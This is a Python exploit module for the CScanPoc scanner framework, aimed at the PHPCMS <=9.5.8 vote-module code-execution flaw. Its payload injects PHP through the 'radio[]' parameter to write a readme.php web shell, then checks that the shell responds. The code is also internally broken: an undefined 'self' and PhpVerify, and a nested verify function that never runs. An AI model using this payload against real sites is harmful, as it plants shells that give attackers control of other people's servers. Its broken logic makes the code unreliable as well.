# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import base64 as b64

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0003'  # 平台漏洞编号，留空
    name = 'PHPCMS /phpcms/modules/vote/index.php 代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-03-27'  # 漏洞公布时间
    desc = '''
        PHPCMS <= 9.5.8 投票处命令执行，可Getshell（需要 PHP <= 5.2）.
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = '<=9.5.8'  # 漏洞应用版本

def get_vote_links(cls, args):
    vul_url = self.target
    vote_url = vul_url + '/index.php?m=vote'
    resp = requests.get(vote_url)
    ids = []
    for miter in re.finditer(r'<a href=.*?subjectid=(?P<id>\d+)', resp.content, re.DOTALL):
        ids.append(miter.group('id'))

    if len(ids) == 0:
        return None

    return {}.fromkeys(ids).keys()

class Poc(ABPoc):
    poc_id = 'f9c9498a-1005-45ab-ad38-64037be16126'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            def verify(cls, args):
                vul_url = self.target
                php = PhpVerify()
                ids = cls.get_vote_links(self.target)
                if ids:
                    for i in ids:
                        vul_path = '/index.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % str(i)
                        exploit_url = vul_url + vul_path

                        payload = {
                            'subjectid': i,
                            'radio[]': ');fputs(fopen(base64_decode(cmVhZG1lLnBocA),w),'
                                       '"%s");\x80' % php.get_content()
                        }

                        requests.post(exploit_url, data=payload)
                        v_path = '/index.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % str(i)
                        requests.get(vul_url + v_path)
                        shell_url = vul_url + '/readme.php'

                        if php.check(shell_url):
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
                            return None
                        else:
                            pass
                else:
                    pass

                return None

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
